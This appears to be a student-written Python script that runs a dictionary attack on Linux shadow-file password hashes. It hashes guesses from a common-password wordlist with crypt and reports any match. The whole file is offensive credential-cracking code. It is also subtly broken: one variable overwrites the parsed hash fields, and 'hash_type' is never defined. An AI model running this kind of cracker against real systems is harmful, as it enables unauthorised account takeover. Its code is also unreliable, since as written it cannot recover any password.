#!/usr/bin/env python3
# Script that performs a dictionary attack against known password hashes
# Needs a dictionary file, suggested to use https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials
# By Melinda 11/1

import crypt
# Load shadow file
with open ("shadow") as shadow_file:
    shadow_lines = shadow_file.readlines()
    shadow_file = "shadow" 

#Load password list
with open ("top1000.txt") as pw_file: 
    passwords = [line.strip() for line in pw_file]

# Try each user in shadow file
for line in shadow_lines:
    parts = line.strip().split (":")
    username = parts[0]
    full_hash = parts [1]

    # Skip if hash is missing or malformed
    if not full_hash or "$" not in full_hash:
        continue
    hash_parts = full_hash.split("$")
    if len (hash_parts) < 4 :
        print (f"Skipping malformed hash: {full_hash}")
        continue
    hash_parts = hash_parts[1]
    salt = hash_parts[2]
    hashed_pw = hash_parts [3]
    full_salt = f"${hash_type}${salt}$"

    # Try each password guess
    found = False
    for guess in passwords:
        guess = guess.strip()
        test_hash = crypt.crypt(guess, full_salt)
        
        if test_hash == full_hash:
            print (f"Password found: {guess}")
            found = True
            break
    
    if not found:
        print("Password not found")